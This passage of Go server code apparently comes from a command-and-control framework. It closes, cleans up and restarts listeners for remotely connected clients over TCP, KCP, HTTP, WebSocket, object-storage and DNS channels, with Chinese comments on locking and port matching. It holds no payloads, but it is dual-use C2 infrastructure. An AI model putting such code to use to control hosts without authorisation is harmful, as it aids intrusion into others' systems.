		delete(connection.TCPServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if lis == nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener not found"})
			return
		}
		err := lis.Close()
		logx.Infof("✅ [监听器管理] TCP监听器已关闭: %s\n", listenerAddress)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "kcp":
		connection.MuClientListenerType.Lock()
		lis := connection.KCPServer[listenerAddress]
		delete(connection.KCPServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if lis == nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener not found"})
			return
		}
		err := lis.Close()
		logx.Infof("✅ [监听器管理] KCP监听器已关闭: %s\n", listenerAddress)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "http", "https":
		connection.MuClientListenerType.Lock()
		srv := connection.HttpServer[listenerAddress]
		delete(connection.HttpServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if srv == nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener not found"})
			return
		}
		err := srv.Close()
		logx.Infof("✅ [监听器管理] %s监听器已关闭: %s\n", strings.ToUpper(listenerType), listenerAddress)
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "oss":
		// 先取通道（锁内），再锁外发信号，最后删除 map 条目
		// （避免"先删后发"导致 OSS 循环读到 nil 通道而永不接收，发送永久阻塞）
		connection.MuClientListenerType.Lock()
		ch := connection.StopChan[listenerAddress]
		connection.MuClientListenerType.Unlock()
		if ch != nil {
			select {
			case ch <- true:
			default:
				// 非阻塞发送：OSS 循环可能正处于 select 之外，避免卡死关闭接口
			}
		}
		connection.MuClientListenerType.Lock()
		delete(connection.StopChan, listenerAddress)
		connection.MuClientListenerType.Unlock()
		logx.Infof("✅ [监听器管理] OSS监听器已关闭: %s\n", listenerAddress)
	case "tcp_forward", "kcp_forward", "ws_forward", "http_forward", "https_forward":
		// 先断会话再发停止信号：拨号循环的 run 阻塞在协议读循环里，只发信号不会让它返回
		closeForwardSession(listenerAddress)
		connection.MuClientListenerType.Lock()
		ch := connection.StopChan[listenerAddress]
		delete(connection.StopChan, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if ch != nil {
			select {
			case ch <- true:
			default:
				// 非阻塞发送：循环可能正处于 select 之外，避免卡死关闭接口
			}
		}
		logx.Infof("✅ [监听器管理] %s 正向监听器已停止拨号: %s\n", strings.ToUpper(listenerType), listenerAddress)

	case "dns":
		dns_listener.Stop()
		logx.Infof("✅ [监听器管理] DNS监听器已关闭: %s\n", listenerAddress)
	}

	logx.Infof("🎯 [监听器管理] %s 监听器 %s 关闭完成，所有客户端已清理\n", listenerType, listenerAddress)
}

// cleanupClientsForListener 清理特定监听器下的所有客户端连接。
// Clients.Listener 只记录协议类型，同一类型可以存在多个监听器（不同端口），
// 因此按类型枚举出的候选集还要按连接的本端端口判定归属，避免关闭一个监听器时
// 误断同类型其他监听器上的客户端（见 connOnListener）。
func cleanupClientsForListener(listenerType string, listenerAddress string) {
	logx.Infof("🧹 [客户端清理] 开始清理 %s 监听器 %s 下的客户端连接\n", listenerType, listenerAddress)

	// 候选集只能按类型枚举：DB 未记录每个客户端所属的监听器地址，
	// 再由 connOnListener 按本端端口筛掉同类型其他监听器的客户端。
	// 无持久连接的协议（http/oss/dns）取不到本端地址，无法判定归属，仍按类型处理。
	var clients []database.Clients
	database.Engine.Where("listener = ? AND online = '1'", listenerType).Find(&clients)

	cleanupCount := 0
	for _, client := range clients {
		uid := client.Uid
		logx.Infof("🔄 [客户端清理] 清理客户端: %s (协议: %s)\n", uid, listenerType)

		// 根据协议类型清理相应的连接管理器
		switch listenerType {
		case "tcp", "tcp_forward", "http_forward", "https_forward":
			tcp.Mutex.Lock()
			if conn, exists := tcp.TCPClientManger[uid]; exists && conn != nil {
				// 同类型多监听器：不属于本监听器的客户端原样保留，不能动
				if !connOnListener(conn, listenerType, listenerAddress) {
					tcp.Mutex.Unlock()
					logx.Infof("⏭️ [客户端清理] 跳过 %s：连接属于同类型其他监听器\n", uid)
					continue
				}
				conn.Close()
				delete(tcp.TCPClientManger, uid)
				delete(tcp.ClientTimeManager, uid)
				logx.Infof("🔌 [客户端清理] TCP连接已断开: %s\n", uid)
			}
			tcp.Mutex.Unlock()

		case "kcp", "kcp_forward":
			k.Mutex.Lock()
			if conn, exists := k.KCPClientManger[uid]; exists && conn != nil {
				// 同类型多监听器：不属于本监听器的客户端原样保留，不能动
				if !connOnListener(conn, listenerType, listenerAddress) {
					k.Mutex.Unlock()
					logx.Infof("⏭️ [客户端清理] 跳过 %s：连接属于同类型其他监听器\n", uid)
					continue
				}
				conn.Close()
				delete(k.KCPClientManger, uid)
				delete(k.ClientTimeManager, uid)
				logx.Infof("🔌 [客户端清理] KCP连接已断开: %s\n", uid)
			}
			k.Mutex.Unlock()

		case "websocket", "ws_forward":
			websocket.MuClientManager.Lock()
			if conn, exists := websocket.ClientManager[uid]; exists && conn != nil {
				// 同类型多监听器：不属于本监听器的客户端原样保留，不能动
				if !connOnListener(conn, listenerType, listenerAddress) {
					websocket.MuClientManager.Unlock()
					logx.Infof("⏭️ [客户端清理] 跳过 %s：连接属于同类型其他监听器\n", uid)
					continue
				}
				// 发送关闭消息并关闭WebSocket连接
				conn.WriteMessage(gorillaws.CloseMessage, gorillaws.FormatCloseMessage(gorillaws.CloseNormalClosure, "监听器关闭"))
				conn.Close()
				delete(websocket.ClientManager, uid)
				logx.Infof("🔌 [客户端清理] WebSocket连接已断开: %s\n", uid)
			}
			websocket.MuClientManager.Unlock()
			// 其余状态(队列/离线检测器/监听类型映射/DB)由连接读循环退出的 defer 统一清理

		case "http":
			communication.MuClientManager.Lock()
			if clientTime, exists := communication.ClientTimeManager[uid]; exists {
				// HTTP是无状态的，只需清理时间管理器
				delete(communication.ClientTimeManager, uid)
				_ = clientTime // 避免未使用变量警告
				logx.Infof("🔌 [客户端清理] HTTP客户端状态已清理: %s\n", uid)
			}
			communication.MuClientManager.Unlock()

		case "oss":
			// OSS协议的客户端清理
			logx.Infof("🔌 [客户端清理] OSS客户端状态已清理: %s\n", uid)
		}

		// 清理全局连接类型映射
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, uid)
		connection.MuClientListenerType.Unlock()

		// 统一离线入口：置 Online=2 + 离线事件 + 队列清理（幂等）
		connection.MarkOffline(uid, listenerType, "监听器关闭清理")
		logx.Infof("📝 [客户端清理] 数据库状态已更新为离线: %s\n", uid)

		cleanupCount++
	}

	logx.Infof("✅ [客户端清理] 完成清理 %s 监听器，共清理 %d 个客户端连接\n", listenerType, cleanupCount)
}

// connAddrs 只要求能报出两端地址：*websocket.Conn 不满足 net.Conn 接口（Read 签名
// 不同），但有 LocalAddr/RemoteAddr 方法，故此处用最小接口而非 net.Conn。
type connAddrs interface {
	LocalAddr() net.Addr
	RemoteAddr() net.Addr
}

// connOnListener 判断一条已建立的连接是否属于指定的监听器。只比对端口：
// 反向监听——连接由本机 Accept，比对本端（LocalAddr）端口；监听地址常绑通配地址
// （0.0.0.0 / ::），而 Accept 到的连接其 LocalAddr 是客户端实际到达的具体 IP，
// 整串比较必然不匹配；同一协议类型下端口唯一标识一个监听器（端口不能重复 bind）。
// 正向监听——连接由本机拨出，监听地址即拨号目标（等于对端地址），须比对远端
// （RemoteAddr）端口；此时本端只是临时端口，与监听地址无关。
// 地址不是 host:port 形式（oss/dns 复用 listen_address 承载凭证与域配置）或取不到
// 地址时无法判定，返回 true 以保持原有"按类型清理"的语义。
func connOnListener(conn connAddrs, listenerType, listenerAddress string) bool {
	_, wantPort, err := net.SplitHostPort(listenerAddress)
	if err != nil || wantPort == "" {
		return true
	}
	var addr net.Addr
	if isForwardListenerType(listenerType) {
		addr = conn.RemoteAddr()
	} else {
		addr = conn.LocalAddr()
	}
	if addr == nil {
		return true
	}
	_, gotPort, err := net.SplitHostPort(addr.String())
	if err != nil {
		return true
	}
	return gotPort == wantPort
}

// auditLogEvent 业务审计快捷入口（D18）
func auditLogEvent(action, result, message string, details map[string]interface{}) {
	if audit.GlobalAuditLogger != nil {
		audit.GlobalAuditLogger.Log(audit.LogLevelInfo, audit.CategoryAPI, action, result, message, details)
	}
}
// RestartListener 重启监听器（断链修复:前端 listener.vue 已有调用,原后端无此路由）。
// 组合现有原语: 若运行中先走 handleClosePort(断开该监听器全部会话),再 handleOpenPort。
// 注意: 重启会断开该监听器下全部客户端连接(前端已加确认弹窗),客户端将自动重连。
func RestartListener(c *gin.Context) {
	var listener struct {
		ListenAddress string `json:"listenAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	listener.ListenAddress = resolveListenerAddress(listener.ListenAddress, "listen")
	var lis database.Listener
	has, _ := database.Engine.Where("listen_address = ?", listener.ListenAddress).Get(&lis)
	if !has {
		c.JSON(http.StatusBadRequest, gin.H{"error": "监听器不存在"})
		return
	}

	// 运行中则先关停。探活句柄:句柄缺失时 handleClosePort 会向 c 写 400(双写风险),
	// 此处先探测,不存在视为已停,跳过 close。
	if lis.Status == 1 {
		if listenerHandleAlive(lis.Type, lis.ListenAddress) {
			database.Engine.Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 2})
			encrypt.InvalidateListenerKeyCache()
			handleClosePort(lis.Type, lis.ListenAddress, c)
		} else {
			// 状态为 1 但句柄已丢(异常退出残留): 仅落库置 2
			database.Engine.Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 2})
			encrypt.InvalidateListenerKeyCache()
			logx.Warnf("⚠️ [监听器重启] %s://%s 状态为运行但句柄缺失,跳过关闭直接重启\n", lis.Type, lis.ListenAddress)
		}
	}

	// 重新启动(handleOpenPort 内含 J4 默认密钥拒绝与 panic 防护)
	database.Engine.Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 1})
	encrypt.InvalidateListenerKeyCache()
	go handleOpenPort(lis.Type, lis.ListenAddress, lis.VKey, lis.EncryptionSalt)
	auditLogEvent("LISTENER_RESTART", "SUCCESS", "重启监听器 "+lis.Type+"://"+lis.ListenAddress, nil)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener restarted"})
}

// listenerHandleAlive 探测监听器运行句柄是否存在(避免 handleClosePort 在句柄
// 缺失分支写响应造成双写)
func listenerHandleAlive(listenerType, listenerAddress string) bool {
	connection.MuClientListenerType.Lock()
	defer connection.MuClientListenerType.Unlock()
	switch listenerType {
	case "websocket", "http", "https":
		return connection.HttpServer[listenerAddress] != nil
	case "tcp":
		return connection.TCPServer[listenerAddress] != nil
	case "kcp":
		return connection.KCPServer[listenerAddress] != nil
	case "oss":
		_, ok := connection.StopChan[listenerAddress]
		return ok
	case "tcp_forward", "kcp_forward", "ws_forward", "http_forward", "https_forward":
		// 正向监听器不 bind 端口，句柄即拨号循环的停止通道
		_, ok := connection.StopChan[listenerAddress]
		return ok
	case "dns":
		return true // DNS 单例监听器,句柄由 Stop() 管理
	default:
		return false
	}
}
